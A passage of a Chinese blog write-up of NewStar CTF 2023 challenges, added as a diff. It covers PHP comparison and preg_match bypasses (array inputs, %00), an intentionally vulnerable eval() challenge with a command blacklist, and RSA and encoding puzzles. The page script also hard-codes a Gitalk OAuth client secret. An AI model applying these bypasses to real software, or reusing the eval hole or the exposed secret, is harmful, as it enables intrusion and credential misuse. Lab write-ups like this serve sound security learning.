fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124224070.png" alt="image-20230926124224070"></p>
+</li>
+<li><p>根据提示已经进入level 2 此时要满足<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code></p>
+<p>像这样的强比较，传入的不是字符串而是数组，不但<strong>md5() 和 sha1()函数</strong>不会报错，结果还会返回<strong>null</strong>，在强比较里面<strong>null&#x3D;null</strong>为true绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124757524.png" alt="image-20230926124757524"></p>
+</li>
+<li><p>此时已经显示进入level 3 ，接着满足<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code></p>
+<p>strcmp 的参数只能是 字符串，当我们传入数组时就会返回NULL，而判断使用的是&#x3D;&#x3D;，NULL&#x3D;&#x3D;0是 bool(true)的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125029145.png" alt="image-20230926125029145"></p>
+</li>
+<li><p>现在进入level 4，现在需要满足<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125148090.png" alt="image-20230926125148090"></p>
+</li>
+<li><p>最后到达level 5，根据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先要过滤preg_match，接着要构造flag5</p>
+<p><strong>建议：当初不是很明白，利用phpstudy构造此页面进行测试</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$var</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5-1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5-2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125720157.png" alt="image-20230926125720157"></p>
+<p>绕过<code>preg_match</code>,通过<code>%00``%5c</code>绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125430120.png" alt="image-20230926125430120"></p>
+</li>
+<li><p>最后得到flag：<code>flag&#123;de665d4c-3bbd-44e8-8eba-2b6cfeef881a&#125;</code></p>
+</li>
+</ol>
+<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p><img src="D:\University\study\markdown\image-20230926205925939.png" alt="image-20230926205925939"></p>
+<ol>
+<li><p>首先观察给出的php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>审查代码得知：需要通过POST传参<code>password</code>和<code>e_v.a.l</code> </p>
+<p>md5碰撞得到：114514的md5值前6为是<code>c4d038</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211145829.png" alt="image-20230926211145829"></p>
+<p>涉及到RCE绕过：通配符绕过，内敛执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211050969.png" alt="image-20230926211050969"></p>
+</li>
+</ol>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p><code>++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.</code></p>
+<p>brainfuck在线解密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144213246.png" alt="image-20230925144213246"></p>
+<p><code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p>
+<h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><p><code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p>
+<p>凯撒密码解密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144342795.png" alt="image-20230925144342795"></p>
+<h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p><code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p>
+<p>栅栏密码解密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144031722.png" alt="image-20230925144031722"></p>
+<p><code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p>
+<h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><h4 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h4><blockquote>
+<p>RSA算法由两个密钥，即公钥和私钥组成。<br>    1）准备两个非常大的素数 p和 q （转换成二进制后 1024个二进制位或者更多，位数越多越难破解）；<br>    2）利用字符串模拟计算大素数 p 和 q 的乘积 m&#x3D;pq；<br>    3）同样方法计算m&#x3D;(p-1)(q-1) ，这里的 m是 n 的欧拉函数；<br>    4）找到一个数e (1&lt;e&lt;m)满足 gcd(m,e)&#x3D;1（即 e 和 m 互素）；<br>    5）计算 e 在模 m 域上的逆元d （即满足ed mod m &#x3D;1 ）；<br>    6）至此，公钥和私钥生成完毕： (n,e)为公钥， (n,d)为私钥；</p>
+</blockquote>
+<p><strong>加密：</strong> 对于明文x，用公钥 (n,e)对 x 加密的过程，就是将 x 转换成数字（字符串的话取其 ASCII码或者 unicode 值），然后通过幂取模计算出y ，其中 y就是密文；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095332177.png" alt="image-20230927095332177"></p>
+<p><strong>解密：</strong>对于密文y ，用私钥 (n,d) 对 y 进行解密的过程和加密类似，同样是计算幂取模；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095404116.png" alt="image-20230927095404116"></p>
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br></pre></td></tr></table></figure>
+
+<p>经过大素数分解：<code>17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</code></p>
+<p>能分解成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2217990919&lt;10&gt; </span><br><span class="line">2338725373&lt;10&gt; </span><br><span class="line">2370292207&lt;10&gt; </span><br><span class="line">2463878387&lt;10&gt; </span><br><span class="line">2706073949&lt;10&gt; </span><br><span class="line">2794985117&lt;10&gt; </span><br><span class="line">2804303069&lt;10&gt; </span><br><span class="line">2923072267&lt;10&gt; </span><br><span class="line">2970591037&lt;10&gt; </span><br><span class="line">3207148519&lt;10&gt; </span><br><span class="line">3654864131&lt;10&gt; </span><br><span class="line">3831680819&lt;10&gt; </span><br><span class="line">3939901243&lt;10&gt; </span><br><span class="line">4093178561&lt;10&gt; </span><br><span class="line">4278428893&lt;10&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据给出的文件 写出解码脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥e</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 欧拉函数eular euler = (p - 1) * (q - 1)</span></span><br><span class="line">num = [<span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>,<span class="number">2706073949</span>, <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>,</span><br><span class="line">       <span class="number">2970591037</span>, <span class="number">3207148519</span>, <span class="number">3654864131</span>, <span class="number">3831680819</span>,<span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span>]</span><br><span class="line">eular = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    eular = eular * (i - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(eular)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"><span class="comment"># 私钥d</span></span><br><span class="line">d = gmpy2.invert(e, eular)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure>
+
+<p>看到题目 得知：flag由三个部分组成 </p>
+<ol>
+<li><p><code>part 1 of flag：</code><strong>base64</strong>  flag{dazzling_encoding#4e0ad4</p>
+</li>
+<li><p><code>part 2 of flag:</code><strong>base32</strong>   f0ca08d1e1d0f10c0c7afe422fea7</p>
+</li>
+<li><p><code>part 3 of flag: </code><strong>UUencode</strong>  c55192c992036ef623372601ff3a}</p>
+</li>
+</ol>
+<blockquote>
+<p>flag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}</p>
+</blockquote>
+<hr>
+<h4 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h4><p>​	<strong>简述：</strong></p>
+<p>​	UUencode是一种二进制到文字的编码，最早在unix邮件系统中使用，全称：Unix-to-Unix  encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p>
+<p>​	<strong>举例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.</span><br><span class="line">密文：,:&amp;5L;&amp;\L=V]R;&amp;0N</span><br></pre></td></tr></table></figure>
+
+<p>​	<strong>在线解密&amp;工具</strong>：</p>
+<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a></p>
+
+  </div>
+  <div>    
+    <ul class="post-copyright">
+       <li class="post-copyright-link">
+        <strong>本文作者：</strong>
+        <a href="/">iahzl</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文标题：</strong>
+        <a href="{{ url_for(config.permalink) }}">
+    
+        <a class="" href="/NewStar-2023/">NewStar 2023</a>
+    
+
+
+</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a title="NewStar 2023">https://iahzl.github.io/NewStar-2023/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本文由 iahzl 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" title="Attribution-NonCommercial-NoDerivatives 4.0 International" rel="license" target="_blank">CC BY-NC-ND 4.0</a>, 转载请保留以上声明信息！
+      </li>
+    </ul>
+</div>
+</article>
+<script>
+  function setClipboardText(event){
+      // clipboardData 对象是为通过编辑菜单、快捷菜单和快捷键执行的编辑操作所保留的，也就是你复制或者剪切内容
+      let clipboardData = event.clipboardData || window.clipboardData;
+      // 如果未复制或者未剪切，则return出去
+      if (!clipboardData) { return; }
+      event.preventDefault();
+      // Selection 对象，表示用户选择的文本范围或光标的当前位置。
+      //     声明一个变量接收 -- 用户输入的剪切或者复制的文本转化为字符串
+      let text = window.getSelection().toString();
+  
+      if (text) {
+          // 如果文本存在则先取消文本默认事件
+          event.preventDefault();
+          // 通过调用常clipboardData对象的 setData(format, data) 方法；来设置相关文本
+          // format: 一个DOMString 表示要添加到 drag object的拖动数据的类型。
+          // data: 一个 DOMString表示要添加到 drag object的数据。
+          var copyright = '\n\n'
+          + '——————————————————————'
+          + '\n版权声明：本文为「Ywj226」的原创文章，遵循CC BY-NC-ND 4.0版权协议，转载请附上原文出处链接及本声明。'
+          + '\n原文链接：https://iahzl.github.io/NewStar-2023/'
+  
+          clipboardData.setData('text/plain', text + copyright);
+  
+      }
+  };
+  var contents = document.getElementsByClassName("content");
+  // 监听文章内容的copy事件
+  contents[0].addEventListener('copy',function(e){
+      setClipboardText(e);
+  });
+</script>
+
+
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: 'a4d73b206590627d55c0',
+            clientSecret: '68744004f2191865ab4a5e6ee2eba67c673c6795',
+            id: md5(window.location.pathname),
+            repo: 'iahzl.github.io',
+            owner: 'iahzl',
+            admin: 'iahzl',
+            distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStar-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">NewStar WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">泄露的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-Upload"><span class="toc-number">1.1.2.</span> <span class="toc-text">Begin of Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ErrorFlask"><span class="toc-number">1.1.3.</span> <span class="toc-text">ErrorFlask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-HTTP"><span class="toc-number">1.1.4.</span> <span class="toc-text">Begin of HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-PHP"><span class="toc-number">1.1.5.</span> <span class="toc-text">Begin of PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.6.</span> <span class="toc-text">R!C!E!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">1.2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#brainfuck"><span class="toc-number">1.2.1.</span> <span class="toc-text">brainfuck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar%E2%80%99s-Secert"><span class="toc-number">1.2.2.</span> <span class="toc-text">Caesar’s Secert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fence"><span class="toc-number">1.2.3.</span> <span class="toc-text">Fence</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa"><span class="toc-number">1.2.4.</span> <span class="toc-text">babyrsa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">RSA算法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyencoding"><span class="toc-number">1.2.5.</span> <span class="toc-text">babyencoding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UUencode"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">UUencode</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar-2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar-2023/&text=NewStar 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar-2023/&is_video=false&description=NewStar 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar 2023&body=Check out this article: https://iahzl.github.io/NewStar-2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar-2023/&name=NewStar 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar-2023/&t=NewStar 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    iahzl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
